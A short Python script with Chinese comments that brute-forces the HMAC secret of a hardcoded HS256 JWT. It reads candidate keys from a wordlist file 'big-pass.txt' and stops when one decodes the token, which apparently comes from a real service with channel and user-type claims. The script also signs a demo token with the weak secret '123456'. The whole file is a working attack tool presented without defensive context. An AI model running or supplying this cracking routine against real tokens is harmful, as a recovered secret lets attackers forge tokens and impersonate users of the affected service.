import time
import jwt

#生成jwt
def jiami():
    #headers
    headers = {
        'alg': "HS256"  # 声明所使用的算法
    }
    # payload
    token_dict = {
        'iat': time.time(),
        'name': 'lowman'
    }
    jwt_token = jwt.encode(token_dict,"123456",algorithm="HS256",headers=headers)
    print(jwt_token)

#解析jwt
def jiemi(key):
    jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjdXJyZW50VGltZU1pbGxpcyI6IjE2MTkwMTk2NDg3ODUiLCJjaGFubmVsTmFtZSI6ImRraiIsInVzZXJUeXBlIjoiQ0hBTk5FTCIsImV4cCI6MTYxOTE5MjQ0OH0.m67IKFRO6DqD4I4LLs7x9zklCQnCOK14p-pBLYw1M9g"
    try:
        data = jwt.decode(jwt_token, key, algorithms=['HS256'])
        print("[success]密钥：{}正确".format(key))
        print(data)
        return True
    except:
        print("[faild]密钥：{}错误".format(key))
        return False


# jiami()
# jiemi('123456')

with open('big-pass.txt','r') as f:
    key_list=f.read().split('\n')
for key in key_list:
    brute=jiemi(key)
    if brute==True:
        break
